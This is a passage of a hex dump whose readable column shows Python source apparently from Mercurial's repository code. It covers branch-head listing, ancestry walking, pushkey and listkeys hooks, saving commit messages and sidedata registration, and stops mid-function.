+0001e4b0: 7920 776f 726b 696e 6763 7478 2074 6f20  y workingctx to 
+0001e4c0: 636c 6561 7220 706f 7374 2d64 6972 7374  clear post-dirst
+0001e4d0: 6174 652d 7374 6174 7573 2068 6f6f 6b73  ate-status hooks
+0001e4e0: 2e22 2222 0a20 2020 2020 2020 2064 656c  .""".        del
+0001e4f0: 2073 656c 662e 5f70 6f73 7464 7373 7461   self._postdssta
+0001e500: 7475 735b 3a5d 0a0a 2020 2020 6465 6620  tus[:]..    def 
+0001e510: 6865 6164 7328 7365 6c66 2c20 7374 6172  heads(self, star
+0001e520: 743d 4e6f 6e65 293a 0a20 2020 2020 2020  t=None):.       
+0001e530: 2069 6620 7374 6172 7420 6973 204e 6f6e   if start is Non
+0001e540: 653a 0a20 2020 2020 2020 2020 2020 2063  e:.            c
+0001e550: 6c20 3d20 7365 6c66 2e63 6861 6e67 656c  l = self.changel
+0001e560: 6f67 0a20 2020 2020 2020 2020 2020 2068  og.            h
+0001e570: 6561 6472 6576 7320 3d20 7265 7665 7273  eadrevs = revers
+0001e580: 6564 2863 6c2e 6865 6164 7265 7673 2829  ed(cl.headrevs()
+0001e590: 290a 2020 2020 2020 2020 2020 2020 7265  ).            re
+0001e5a0: 7475 726e 205b 636c 2e6e 6f64 6528 7265  turn [cl.node(re
+0001e5b0: 7629 2066 6f72 2072 6576 2069 6e20 6865  v) for rev in he
+0001e5c0: 6164 7265 7673 5d0a 0a20 2020 2020 2020  adrevs]..       
+0001e5d0: 2068 6561 6473 203d 2073 656c 662e 6368   heads = self.ch
+0001e5e0: 616e 6765 6c6f 672e 6865 6164 7328 7374  angelog.heads(st
+0001e5f0: 6172 7429 0a20 2020 2020 2020 2023 2073  art).        # s
+0001e600: 6f72 7420 7468 6520 6f75 7470 7574 2069  ort the output i
+0001e610: 6e20 7265 7620 6465 7363 656e 6469 6e67  n rev descending
+0001e620: 206f 7264 6572 0a20 2020 2020 2020 2072   order.        r
+0001e630: 6574 7572 6e20 736f 7274 6564 2868 6561  eturn sorted(hea
+0001e640: 6473 2c20 6b65 793d 7365 6c66 2e63 6861  ds, key=self.cha
+0001e650: 6e67 656c 6f67 2e72 6576 2c20 7265 7665  ngelog.rev, reve
+0001e660: 7273 653d 5472 7565 290a 0a20 2020 2064  rse=True)..    d
+0001e670: 6566 2062 7261 6e63 6868 6561 6473 2873  ef branchheads(s
+0001e680: 656c 662c 2062 7261 6e63 683d 4e6f 6e65  elf, branch=None
+0001e690: 2c20 7374 6172 743d 4e6f 6e65 2c20 636c  , start=None, cl
+0001e6a0: 6f73 6564 3d46 616c 7365 293a 0a20 2020  osed=False):.   
+0001e6b0: 2020 2020 2022 2222 7265 7475 726e 2061       """return a
+0001e6c0: 2028 706f 7373 6962 6c79 2066 696c 7465   (possibly filte
+0001e6d0: 7265 6429 206c 6973 7420 6f66 2068 6561  red) list of hea
+0001e6e0: 6473 2066 6f72 2074 6865 2067 6976 656e  ds for the given
+0001e6f0: 2062 7261 6e63 680a 0a20 2020 2020 2020   branch..       
+0001e700: 2048 6561 6473 2061 7265 2072 6574 7572   Heads are retur
+0001e710: 6e65 6420 696e 2074 6f70 6f6c 6f67 6963  ned in topologic
+0001e720: 616c 206f 7264 6572 2c20 6672 6f6d 206e  al order, from n
+0001e730: 6577 6573 7420 746f 206f 6c64 6573 742e  ewest to oldest.
+0001e740: 0a20 2020 2020 2020 2049 6620 6272 616e  .        If bran
+0001e750: 6368 2069 7320 4e6f 6e65 2c20 7573 6520  ch is None, use 
+0001e760: 7468 6520 6469 7273 7461 7465 2062 7261  the dirstate bra
+0001e770: 6e63 682e 0a20 2020 2020 2020 2049 6620  nch..        If 
+0001e780: 7374 6172 7420 6973 206e 6f74 204e 6f6e  start is not Non
+0001e790: 652c 2072 6574 7572 6e20 6f6e 6c79 2068  e, return only h
+0001e7a0: 6561 6473 2072 6561 6368 6162 6c65 2066  eads reachable f
+0001e7b0: 726f 6d20 7374 6172 742e 0a20 2020 2020  rom start..     
+0001e7c0: 2020 2049 6620 636c 6f73 6564 2069 7320     If closed is 
+0001e7d0: 5472 7565 2c20 7265 7475 726e 2068 6561  True, return hea
+0001e7e0: 6473 2074 6861 7420 6172 6520 6d61 726b  ds that are mark
+0001e7f0: 6564 2061 7320 636c 6f73 6564 2061 7320  ed as closed as 
+0001e800: 7765 6c6c 2e0a 2020 2020 2020 2020 2222  well..        ""
+0001e810: 220a 2020 2020 2020 2020 6966 2062 7261  ".        if bra
+0001e820: 6e63 6820 6973 204e 6f6e 653a 0a20 2020  nch is None:.   
+0001e830: 2020 2020 2020 2020 2062 7261 6e63 6820           branch 
+0001e840: 3d20 7365 6c66 5b4e 6f6e 655d 2e62 7261  = self[None].bra
+0001e850: 6e63 6828 290a 2020 2020 2020 2020 6272  nch().        br
+0001e860: 616e 6368 6573 203d 2073 656c 662e 6272  anches = self.br
+0001e870: 616e 6368 6d61 7028 290a 2020 2020 2020  anchmap().      
+0001e880: 2020 6966 206e 6f74 2062 7261 6e63 6865    if not branche
+0001e890: 732e 6861 7362 7261 6e63 6828 6272 616e  s.hasbranch(bran
+0001e8a0: 6368 293a 0a20 2020 2020 2020 2020 2020  ch):.           
+0001e8b0: 2072 6574 7572 6e20 5b5d 0a20 2020 2020   return [].     
+0001e8c0: 2020 2023 2074 6865 2063 6163 6865 2072     # the cache r
+0001e8d0: 6574 7572 6e73 2068 6561 6473 206f 7264  eturns heads ord
+0001e8e0: 6572 6564 206c 6f77 6573 7420 746f 2068  ered lowest to h
+0001e8f0: 6967 6865 7374 0a20 2020 2020 2020 2062  ighest.        b
+0001e900: 6865 6164 7320 3d20 6c69 7374 2872 6576  heads = list(rev
+0001e910: 6572 7365 6428 6272 616e 6368 6573 2e62  ersed(branches.b
+0001e920: 7261 6e63 6868 6561 6473 2862 7261 6e63  ranchheads(branc
+0001e930: 682c 2063 6c6f 7365 643d 636c 6f73 6564  h, closed=closed
+0001e940: 2929 290a 2020 2020 2020 2020 6966 2073  ))).        if s
+0001e950: 7461 7274 2069 7320 6e6f 7420 4e6f 6e65  tart is not None
+0001e960: 3a0a 2020 2020 2020 2020 2020 2020 2320  :.            # 
+0001e970: 6669 6c74 6572 206f 7574 2074 6865 2068  filter out the h
+0001e980: 6561 6473 2074 6861 7420 6361 6e6e 6f74  eads that cannot
+0001e990: 2062 6520 7265 6163 6865 6420 6672 6f6d   be reached from
+0001e9a0: 2073 7461 7274 7265 760a 2020 2020 2020   startrev.      
+0001e9b0: 2020 2020 2020 6662 6865 6164 7320 3d20        fbheads = 
+0001e9c0: 7365 7428 7365 6c66 2e63 6861 6e67 656c  set(self.changel
+0001e9d0: 6f67 2e6e 6f64 6573 6265 7477 6565 6e28  og.nodesbetween(
+0001e9e0: 5b73 7461 7274 5d2c 2062 6865 6164 7329  [start], bheads)
+0001e9f0: 5b32 5d29 0a20 2020 2020 2020 2020 2020  [2]).           
+0001ea00: 2062 6865 6164 7320 3d20 5b68 2066 6f72   bheads = [h for
+0001ea10: 2068 2069 6e20 6268 6561 6473 2069 6620   h in bheads if 
+0001ea20: 6820 696e 2066 6268 6561 6473 5d0a 2020  h in fbheads].  
+0001ea30: 2020 2020 2020 7265 7475 726e 2062 6865        return bhe
+0001ea40: 6164 730a 0a20 2020 2064 6566 2062 7261  ads..    def bra
+0001ea50: 6e63 6865 7328 7365 6c66 2c20 6e6f 6465  nches(self, node
+0001ea60: 7329 3a0a 2020 2020 2020 2020 6966 206e  s):.        if n
+0001ea70: 6f74 206e 6f64 6573 3a0a 2020 2020 2020  ot nodes:.      
+0001ea80: 2020 2020 2020 6e6f 6465 7320 3d20 5b73        nodes = [s
+0001ea90: 656c 662e 6368 616e 6765 6c6f 672e 7469  elf.changelog.ti
+0001eaa0: 7028 295d 0a20 2020 2020 2020 2062 203d  p()].        b =
+0001eab0: 205b 5d0a 2020 2020 2020 2020 666f 7220   [].        for 
+0001eac0: 6e20 696e 206e 6f64 6573 3a0a 2020 2020  n in nodes:.    
+0001ead0: 2020 2020 2020 2020 7420 3d20 6e0a 2020          t = n.  
+0001eae0: 2020 2020 2020 2020 2020 7768 696c 6520            while 
+0001eaf0: 5472 7565 3a0a 2020 2020 2020 2020 2020  True:.          
+0001eb00: 2020 2020 2020 7020 3d20 7365 6c66 2e63        p = self.c
+0001eb10: 6861 6e67 656c 6f67 2e70 6172 656e 7473  hangelog.parents
+0001eb20: 286e 290a 2020 2020 2020 2020 2020 2020  (n).            
+0001eb30: 2020 2020 6966 2070 5b31 5d20 213d 2073      if p[1] != s
+0001eb40: 656c 662e 6e75 6c6c 6964 206f 7220 705b  elf.nullid or p[
+0001eb50: 305d 203d 3d20 7365 6c66 2e6e 756c 6c69  0] == self.nulli
+0001eb60: 643a 0a20 2020 2020 2020 2020 2020 2020  d:.             
+0001eb70: 2020 2020 2020 2062 2e61 7070 656e 6428         b.append(
+0001eb80: 2874 2c20 6e2c 2070 5b30 5d2c 2070 5b31  (t, n, p[0], p[1
+0001eb90: 5d29 290a 2020 2020 2020 2020 2020 2020  ])).            
+0001eba0: 2020 2020 2020 2020 6272 6561 6b0a 2020          break.  
+0001ebb0: 2020 2020 2020 2020 2020 2020 2020 6e20                n 
+0001ebc0: 3d20 705b 305d 0a20 2020 2020 2020 2072  = p[0].        r
+0001ebd0: 6574 7572 6e20 620a 0a20 2020 2064 6566  eturn b..    def
+0001ebe0: 2062 6574 7765 656e 2873 656c 662c 2070   between(self, p
+0001ebf0: 6169 7273 293a 0a20 2020 2020 2020 2072  airs):.        r
+0001ec00: 203d 205b 5d0a 0a20 2020 2020 2020 2066   = []..        f
+0001ec10: 6f72 2074 6f70 2c20 626f 7474 6f6d 2069  or top, bottom i
+0001ec20: 6e20 7061 6972 733a 0a20 2020 2020 2020  n pairs:.       
+0001ec30: 2020 2020 206e 2c20 6c2c 2069 203d 2074       n, l, i = t
+0001ec40: 6f70 2c20 5b5d 2c20 300a 2020 2020 2020  op, [], 0.      
+0001ec50: 2020 2020 2020 6620 3d20 310a 0a20 2020        f = 1..   
+0001ec60: 2020 2020 2020 2020 2077 6869 6c65 206e           while n
+0001ec70: 2021 3d20 626f 7474 6f6d 2061 6e64 206e   != bottom and n
+0001ec80: 2021 3d20 7365 6c66 2e6e 756c 6c69 643a   != self.nullid:
+0001ec90: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+0001eca0: 2070 203d 2073 656c 662e 6368 616e 6765   p = self.change
+0001ecb0: 6c6f 672e 7061 7265 6e74 7328 6e29 5b30  log.parents(n)[0
+0001ecc0: 5d0a 2020 2020 2020 2020 2020 2020 2020  ].              
+0001ecd0: 2020 6966 2069 203d 3d20 663a 0a20 2020    if i == f:.   
+0001ece0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+0001ecf0: 206c 2e61 7070 656e 6428 6e29 0a20 2020   l.append(n).   
+0001ed00: 2020 2020 2020 2020 2020 2020 2020 2020                  
+0001ed10: 2066 203d 2066 202a 2032 0a20 2020 2020   f = f * 2.     
+0001ed20: 2020 2020 2020 2020 2020 206e 203d 2070             n = p
+0001ed30: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+0001ed40: 2069 202b 3d20 310a 0a20 2020 2020 2020   i += 1..       
+0001ed50: 2020 2020 2072 2e61 7070 656e 6428 6c29       r.append(l)
+0001ed60: 0a0a 2020 2020 2020 2020 7265 7475 726e  ..        return
+0001ed70: 2072 0a0a 2020 2020 6465 6620 6368 6563   r..    def chec
+0001ed80: 6b70 7573 6828 7365 6c66 2c20 7075 7368  kpush(self, push
+0001ed90: 6f70 293a 0a20 2020 2020 2020 2022 2222  op):.        """
+0001eda0: 4578 7465 6e73 696f 6e73 2063 616e 206f  Extensions can o
+0001edb0: 7665 7272 6964 6520 7468 6973 2066 756e  verride this fun
+0001edc0: 6374 696f 6e20 6966 2061 6464 6974 696f  ction if additio
+0001edd0: 6e61 6c20 6368 6563 6b73 2068 6176 650a  nal checks have.
+0001ede0: 2020 2020 2020 2020 746f 2062 6520 7065          to be pe
+0001edf0: 7266 6f72 6d65 6420 6265 666f 7265 2070  rformed before p
+0001ee00: 7573 6869 6e67 2c20 6f72 2063 616c 6c20  ushing, or call 
+0001ee10: 6974 2069 6620 7468 6579 206f 7665 7272  it if they overr
+0001ee20: 6964 6520 7075 7368 0a20 2020 2020 2020  ide push.       
+0001ee30: 2063 6f6d 6d61 6e64 2e0a 2020 2020 2020   command..      
+0001ee40: 2020 2222 220a 0a20 2020 2040 756e 6669    """..    @unfi
+0001ee50: 6c74 6572 6564 7072 6f70 6572 7479 6361  lteredpropertyca
+0001ee60: 6368 650a 2020 2020 6465 6620 7072 6570  che.    def prep
+0001ee70: 7573 686f 7574 676f 696e 6768 6f6f 6b73  ushoutgoinghooks
+0001ee80: 2873 656c 6629 3a0a 2020 2020 2020 2020  (self):.        
+0001ee90: 2222 2252 6574 7572 6e20 7574 696c 2e68  """Return util.h
+0001eea0: 6f6f 6b73 2063 6f6e 7369 7374 7320 6f66  ooks consists of
+0001eeb0: 2061 2070 7573 686f 7020 7769 7468 2072   a pushop with r
+0001eec0: 6570 6f2c 2072 656d 6f74 652c 206f 7574  epo, remote, out
+0001eed0: 676f 696e 670a 2020 2020 2020 2020 6d65  going.        me
+0001eee0: 7468 6f64 732c 2077 6869 6368 2061 7265  thods, which are
+0001eef0: 2063 616c 6c65 6420 6265 666f 7265 2070   called before p
+0001ef00: 7573 6869 6e67 2063 6861 6e67 6573 6574  ushing changeset
+0001ef10: 732e 0a20 2020 2020 2020 2022 2222 0a20  s..        """. 
+0001ef20: 2020 2020 2020 2072 6574 7572 6e20 7574         return ut
+0001ef30: 696c 2e68 6f6f 6b73 2829 0a0a 2020 2020  il.hooks()..    
+0001ef40: 6465 6620 7075 7368 6b65 7928 7365 6c66  def pushkey(self
+0001ef50: 2c20 6e61 6d65 7370 6163 652c 206b 6579  , namespace, key
+0001ef60: 2c20 6f6c 642c 206e 6577 293a 0a20 2020  , old, new):.   
+0001ef70: 2020 2020 2074 7279 3a0a 2020 2020 2020       try:.      
+0001ef80: 2020 2020 2020 7472 203d 2073 656c 662e        tr = self.
+0001ef90: 6375 7272 656e 7474 7261 6e73 6163 7469  currenttransacti
+0001efa0: 6f6e 2829 0a20 2020 2020 2020 2020 2020  on().           
+0001efb0: 2068 6f6f 6b61 7267 7320 3d20 7b7d 0a20   hookargs = {}. 
+0001efc0: 2020 2020 2020 2020 2020 2069 6620 7472             if tr
+0001efd0: 2069 7320 6e6f 7420 4e6f 6e65 3a0a 2020   is not None:.  
+0001efe0: 2020 2020 2020 2020 2020 2020 2020 686f                ho
+0001eff0: 6f6b 6172 6773 2e75 7064 6174 6528 7472  okargs.update(tr
+0001f000: 2e68 6f6f 6b61 7267 7329 0a20 2020 2020  .hookargs).     
+0001f010: 2020 2020 2020 2068 6f6f 6b61 7267 7320         hookargs 
+0001f020: 3d20 7079 636f 6d70 6174 2e73 7472 6b77  = pycompat.strkw
+0001f030: 6172 6773 2868 6f6f 6b61 7267 7329 0a20  args(hookargs). 
+0001f040: 2020 2020 2020 2020 2020 2068 6f6f 6b61             hooka
+0001f050: 7267 735b 276e 616d 6573 7061 6365 275d  rgs['namespace']
+0001f060: 203d 206e 616d 6573 7061 6365 0a20 2020   = namespace.   
+0001f070: 2020 2020 2020 2020 2068 6f6f 6b61 7267           hookarg
+0001f080: 735b 276b 6579 275d 203d 206b 6579 0a20  s['key'] = key. 
+0001f090: 2020 2020 2020 2020 2020 2068 6f6f 6b61             hooka
+0001f0a0: 7267 735b 276f 6c64 275d 203d 206f 6c64  rgs['old'] = old
+0001f0b0: 0a20 2020 2020 2020 2020 2020 2068 6f6f  .            hoo
+0001f0c0: 6b61 7267 735b 276e 6577 275d 203d 206e  kargs['new'] = n
+0001f0d0: 6577 0a20 2020 2020 2020 2020 2020 2073  ew.            s
+0001f0e0: 656c 662e 686f 6f6b 2862 2770 7265 7075  elf.hook(b'prepu
+0001f0f0: 7368 6b65 7927 2c20 7468 726f 773d 5472  shkey', throw=Tr
+0001f100: 7565 2c20 2a2a 686f 6f6b 6172 6773 290a  ue, **hookargs).
+0001f110: 2020 2020 2020 2020 6578 6365 7074 2065          except e
+0001f120: 7272 6f72 2e48 6f6f 6b41 626f 7274 2061  rror.HookAbort a
+0001f130: 7320 6578 633a 0a20 2020 2020 2020 2020  s exc:.         
+0001f140: 2020 2073 656c 662e 7569 2e77 7269 7465     self.ui.write
+0001f150: 5f65 7272 285f 2862 2270 7573 686b 6579  _err(_(b"pushkey
+0001f160: 2d61 626f 7274 3a20 2573 5c6e 2229 2025  -abort: %s\n") %
+0001f170: 2065 7863 290a 2020 2020 2020 2020 2020   exc).          
+0001f180: 2020 6966 2065 7863 2e68 696e 743a 0a20    if exc.hint:. 
+0001f190: 2020 2020 2020 2020 2020 2020 2020 2073                 s
+0001f1a0: 656c 662e 7569 2e77 7269 7465 5f65 7272  elf.ui.write_err
+0001f1b0: 285f 2862 2228 2573 295c 6e22 2920 2520  (_(b"(%s)\n") % 
+0001f1c0: 6578 632e 6869 6e74 290a 2020 2020 2020  exc.hint).      
+0001f1d0: 2020 2020 2020 7265 7475 726e 2046 616c        return Fal
+0001f1e0: 7365 0a20 2020 2020 2020 2073 656c 662e  se.        self.
+0001f1f0: 7569 2e64 6562 7567 2862 2770 7573 6869  ui.debug(b'pushi
+0001f200: 6e67 206b 6579 2066 6f72 2022 2573 3a25  ng key for "%s:%
+0001f210: 7322 5c6e 2720 2520 286e 616d 6573 7061  s"\n' % (namespa
+0001f220: 6365 2c20 6b65 7929 290a 2020 2020 2020  ce, key)).      
+0001f230: 2020 7265 7420 3d20 7075 7368 6b65 792e    ret = pushkey.
+0001f240: 7075 7368 2873 656c 662c 206e 616d 6573  push(self, names
+0001f250: 7061 6365 2c20 6b65 792c 206f 6c64 2c20  pace, key, old, 
+0001f260: 6e65 7729 0a0a 2020 2020 2020 2020 6465  new)..        de
+0001f270: 6620 7275 6e68 6f6f 6b28 756e 7573 6564  f runhook(unused
+0001f280: 5f73 7563 6365 7373 293a 0a20 2020 2020  _success):.     
+0001f290: 2020 2020 2020 2073 656c 662e 686f 6f6b         self.hook
+0001f2a0: 280a 2020 2020 2020 2020 2020 2020 2020  (.              
+0001f2b0: 2020 6227 7075 7368 6b65 7927 2c0a 2020    b'pushkey',.  
+0001f2c0: 2020 2020 2020 2020 2020 2020 2020 6e61                na
+0001f2d0: 6d65 7370 6163 653d 6e61 6d65 7370 6163  mespace=namespac
+0001f2e0: 652c 0a20 2020 2020 2020 2020 2020 2020  e,.             
+0001f2f0: 2020 206b 6579 3d6b 6579 2c0a 2020 2020     key=key,.    
+0001f300: 2020 2020 2020 2020 2020 2020 6f6c 643d              old=
+0001f310: 6f6c 642c 0a20 2020 2020 2020 2020 2020  old,.           
+0001f320: 2020 2020 206e 6577 3d6e 6577 2c0a 2020       new=new,.  
+0001f330: 2020 2020 2020 2020 2020 2020 2020 7265                re
+0001f340: 743d 7265 742c 0a20 2020 2020 2020 2020  t=ret,.         
+0001f350: 2020 2029 0a0a 2020 2020 2020 2020 7365     )..        se
+0001f360: 6c66 2e5f 6166 7465 726c 6f63 6b28 7275  lf._afterlock(ru
+0001f370: 6e68 6f6f 6b29 0a20 2020 2020 2020 2072  nhook).        r
+0001f380: 6574 7572 6e20 7265 740a 0a20 2020 2064  eturn ret..    d
+0001f390: 6566 206c 6973 746b 6579 7328 7365 6c66  ef listkeys(self
+0001f3a0: 2c20 6e61 6d65 7370 6163 6529 3a0a 2020  , namespace):.  
+0001f3b0: 2020 2020 2020 7365 6c66 2e68 6f6f 6b28        self.hook(
+0001f3c0: 6227 7072 656c 6973 746b 6579 7327 2c20  b'prelistkeys', 
+0001f3d0: 7468 726f 773d 5472 7565 2c20 6e61 6d65  throw=True, name
+0001f3e0: 7370 6163 653d 6e61 6d65 7370 6163 6529  space=namespace)
+0001f3f0: 0a20 2020 2020 2020 2073 656c 662e 7569  .        self.ui
+0001f400: 2e64 6562 7567 2862 276c 6973 7469 6e67  .debug(b'listing
+0001f410: 206b 6579 7320 666f 7220 2225 7322 5c6e   keys for "%s"\n
+0001f420: 2720 2520 6e61 6d65 7370 6163 6529 0a20  ' % namespace). 
+0001f430: 2020 2020 2020 2076 616c 7565 7320 3d20         values = 
+0001f440: 7075 7368 6b65 792e 6c69 7374 2873 656c  pushkey.list(sel
+0001f450: 662c 206e 616d 6573 7061 6365 290a 2020  f, namespace).  
+0001f460: 2020 2020 2020 7365 6c66 2e68 6f6f 6b28        self.hook(
+0001f470: 6227 6c69 7374 6b65 7973 272c 206e 616d  b'listkeys', nam
+0001f480: 6573 7061 6365 3d6e 616d 6573 7061 6365  espace=namespace
+0001f490: 2c20 7661 6c75 6573 3d76 616c 7565 7329  , values=values)
+0001f4a0: 0a20 2020 2020 2020 2072 6574 7572 6e20  .        return 
+0001f4b0: 7661 6c75 6573 0a0a 2020 2020 6465 6620  values..    def 
+0001f4c0: 6465 6275 6777 6972 6561 7267 7328 7365  debugwireargs(se
+0001f4d0: 6c66 2c20 6f6e 652c 2074 776f 2c20 7468  lf, one, two, th
+0001f4e0: 7265 653d 4e6f 6e65 2c20 666f 7572 3d4e  ree=None, four=N
+0001f4f0: 6f6e 652c 2066 6976 653d 4e6f 6e65 293a  one, five=None):
+0001f500: 0a20 2020 2020 2020 2027 2727 7573 6564  .        '''used
+0001f510: 2074 6f20 7465 7374 2061 7267 756d 656e   to test argumen
+0001f520: 7420 7061 7373 696e 6720 6f76 6572 2074  t passing over t
+0001f530: 6865 2077 6972 6527 2727 0a20 2020 2020  he wire'''.     
+0001f540: 2020 2072 6574 7572 6e20 6222 2573 2025     return b"%s %
+0001f550: 7320 2573 2025 7320 2573 2220 2520 280a  s %s %s %s" % (.
+0001f560: 2020 2020 2020 2020 2020 2020 6f6e 652c              one,
+0001f570: 0a20 2020 2020 2020 2020 2020 2074 776f  .            two
+0001f580: 2c0a 2020 2020 2020 2020 2020 2020 7079  ,.            py
+0001f590: 636f 6d70 6174 2e62 7974 6573 7472 2874  compat.bytestr(t
+0001f5a0: 6872 6565 292c 0a20 2020 2020 2020 2020  hree),.         
+0001f5b0: 2020 2070 7963 6f6d 7061 742e 6279 7465     pycompat.byte
+0001f5c0: 7374 7228 666f 7572 292c 0a20 2020 2020  str(four),.     
+0001f5d0: 2020 2020 2020 2070 7963 6f6d 7061 742e         pycompat.
+0001f5e0: 6279 7465 7374 7228 6669 7665 292c 0a20  bytestr(five),. 
+0001f5f0: 2020 2020 2020 2029 0a0a 2020 2020 6465         )..    de
+0001f600: 6620 7361 7665 636f 6d6d 6974 6d65 7373  f savecommitmess
+0001f610: 6167 6528 7365 6c66 2c20 7465 7874 293a  age(self, text):
+0001f620: 0a20 2020 2020 2020 2066 7020 3d20 7365  .        fp = se
+0001f630: 6c66 2e76 6673 2862 276c 6173 742d 6d65  lf.vfs(b'last-me
+0001f640: 7373 6167 652e 7478 7427 2c20 6227 7762  ssage.txt', b'wb
+0001f650: 2729 0a20 2020 2020 2020 2074 7279 3a0a  ').        try:.
+0001f660: 2020 2020 2020 2020 2020 2020 6670 2e77              fp.w
+0001f670: 7269 7465 2874 6578 7429 0a20 2020 2020  rite(text).     
+0001f680: 2020 2066 696e 616c 6c79 3a0a 2020 2020     finally:.    
+0001f690: 2020 2020 2020 2020 6670 2e63 6c6f 7365          fp.close
+0001f6a0: 2829 0a20 2020 2020 2020 2072 6574 7572  ().        retur
+0001f6b0: 6e20 7365 6c66 2e70 6174 6874 6f28 6670  n self.pathto(fp
+0001f6c0: 2e6e 616d 655b 6c65 6e28 7365 6c66 2e72  .name[len(self.r
+0001f6d0: 6f6f 7429 202b 2031 203a 5d29 0a0a 2020  oot) + 1 :])..  
+0001f6e0: 2020 6465 6620 7265 6769 7374 6572 5f77    def register_w
+0001f6f0: 616e 7465 645f 7369 6465 6461 7461 2873  anted_sidedata(s
+0001f700: 656c 662c 2063 6174 6567 6f72 7929 3a0a  elf, category):.
+0001f710: 2020 2020 2020 2020 6966 2072 6570 6f73          if repos
+0001f720: 6974 6f72 792e 5245 504f 5f46 4541 5455  itory.REPO_FEATU
+0001f730: 5245 5f53 4944 455f 4441 5441 206e 6f74  RE_SIDE_DATA not
+0001f740: 2069 6e20 7365 6c66 2e66 6561 7475 7265   in self.feature
+0001f750: 733a 0a20 2020 2020 2020 2020 2020 2023  s:.            #
+0001f760: 204f 6e6c 7920 7265 766c 6f67 7632 2072   Only revlogv2 r
+0001f770: 6570 6f73 2063 616e 2077 616e 7420 7369  epos can want si
+0001f780: 6465 6461 7461 2e0a 2020 2020 2020 2020  dedata..        
+0001f790: 2020 2020 7265 7475 726e 0a20 2020 2020      return.     
+0001f7a0: 2020 2073 656c 662e 5f77 616e 7465 645f     self._wanted_
+0001f7b0: 7369 6465 6461 7461 2e61 6464 2870 7963  sidedata.add(pyc
+0001f7c0: 6f6d 7061 742e 6279 7465 7374 7228 6361  ompat.bytestr(ca
+0001f7d0: 7465 676f 7279 2929 0a0a 2020 2020 6465  tegory))..    de
+0001f7e0: 6620 7265 6769 7374 6572 5f73 6964 6564  f register_sided
+0001f7f0: 6174 615f 636f 6d70 7574 6572 280a 2020  ata_computer(.  
+0001f800: 2020 2020 2020 7365 6c66 2c20 6b69 6e64        self, kind
+0001f810: 2c20 6361 7465 676f 7279 2c20 6b65 7973  , category, keys
+0001f820: 2c20 636f 6d70 7574 6572 2c20 666c 6167  , computer, flag
+0001f830: 732c 2072 6570 6c61 6365 3d46 616c 7365  s, replace=False
+0001f840: 0a20 2020 2029 3a0a 2020 2020 2020 2020  .    ):.        
+0001f850: 6966 206b 696e 6420 6e6f 7420 696e 2072  if kind not in r
+0001f860: 6576 6c6f 6763 6f6e 7374 2e41 4c4c 5f4b  evlogconst.ALL_K
+0001f870: 494e 4453 3a0a 2020 2020 2020 2020 2020  INDS:.          
+0001f880: 2020 6d73 6720 3d20 5f28 6222 756e 6578    msg = _(b"unex
+0001f890: 7065 6374 6564 2072 6576 6c6f 6720 6b69  pected revlog ki
+0001f8a0: 6e64 2027 2573 272e 2229 0a20 2020 2020  nd '%s'.").     
+0001f8b0: 2020 2020 2020 2072 6169 7365 2065 7272         raise err
+0001f8c0: 6f72 2e50 726f 6772 616d 6d69 6e67 4572  or.ProgrammingEr
+0001f8d0: 726f 7228 6d73 6720 2520 6b69 6e64 290a  ror(msg % kind).
+0001f8e0: 2020 2020 2020 2020 6361 7465 676f 7279          category
+0001f8f0: 203d 2070 7963 6f6d 7061 742e 6279 7465   = pycompat.byte
+0001f900: 7374 7228 6361 7465 676f 7279 290a 2020  str(category).  
+0001f910: 2020 2020 2020 616c 7265 6164 795f 7265        already_re
+0001f920: 6769 7374 6572 6564 203d 2063 6174 6567  gistered = categ
+0001f930: 6f72 7920 696e 2073 656c 662e 5f73 6964  ory in self._sid
+0001f940: 6564 6174 615f 636f 6d70 7574 6572 732e  edata_computers.
+0001f950: 6765 7428 6b69 6e64 2c20 5b5d 290a 2020  get(kind, []).  
+0001f960: 2020 2020 2020 6966 2061 6c72 6561 6479        if already
+0001f970: 5f72 6567 6973 7465 7265 6420 616e 6420  _registered and 
+0001f980: 6e6f 7420 7265 706c 6163 653a 0a20 2020  not replace:.   
+0001f990: 2020 2020 2020 2020 206d 7367 203d 205f           msg = _
+0001f9a0: 280a 2020 2020 2020 2020 2020 2020 2020  (.              
+0001f9b0: 2020 6222 6361 6e6e 6f74 2072 6567 6973    b"cannot regis
+0001f9c0: 7465 7220 6120 7369 6465 6461 7461 2063  ter a sidedata c
+0001f9d0: 6f6d 7075 7465 7220 7477 6963 6520 666f  omputer twice fo
+0001f9e0: 7220 6361 7465 676f 7279 2027 2573 272e  r category '%s'.
+0001f9f0: 220a 2020 2020 2020 2020 2020 2020 290a  ".            ).
+0001fa00: 2020 2020 2020 2020 2020 2020 7261 6973              rais
+0001fa10: 6520 6572 726f 722e 5072 6f67 7261 6d6d  e error.Programm
+0001fa20: 696e 6745 7272 6f72 286d 7367 2025 2063  ingError(msg % c
+0001fa30: 6174 6567 6f72 7929 0a20 2020 2020 2020  ategory).       
+0001fa40: 2069 6620 7265 706c 6163 6520 616e 6420   if replace and 
+0001fa50: 6e6f 7420 616c 7265 6164 795f 7265 6769  not already_regi
+0001fa60: 7374 6572 6564 3a0a 2020 2020 2020 2020  stered:.        
+0001fa70: 2020 2020 6d73 6720 3d20 5f28 0a20 2020      msg = _(.   
+0001fa80: 2020 2020 2020 2020 2020 2020 2062 2263               b"c
+0001fa90: 616e 6e6f 7420 7265 706c 6163 6520 6120  annot replace a 
+0001faa0: 7369 6465 6461 7461 2063 6f6d 7075 7465  sidedata compute
+0001fab0: 7220 7468 6174 2069 736e 2774 2072 6567  r that isn't reg
+0001fac0: 6973 7465 7265 6420 220a 2020 2020 2020  istered ".      
+0001fad0: 2020 2020 2020 2020 2020 6222 666f 7220            b"for 
+0001fae0: 6361 7465 676f 7279 2027 2573 272e 220a  category '%s'.".
+0001faf0: 2020 2020 2020 2020 2020 2020 290a 2020              ).  
+0001fb00: 2020 2020 2020 2020 2020 7261 6973 6520            raise 
+0001fb10: 6572 726f 722e 5072 6f67 7261 6d6d 696e  error.Programmin
+0001fb20: 6745 7272 6f72 286d 7367 2025 2063 6174  gError(msg % cat
+0001fb30: 6567 6f72 7929 0a20 2020 2020 2020 2073  egory).        s
+0001fb40: 656c 662e 5f73 6964 6564 6174 615f 636f  elf._sidedata_co
+0001fb50: 6d70 7574 6572 732e 7365 7464 6566 6175  mputers.setdefau
+0001fb60: 6c74 286b 696e 642c 207b 7d29 0a20 2020  lt(kind, {}).   
+0001fb70: 2020 2020 2073 656c 662e 5f73 6964 6564       self._sided
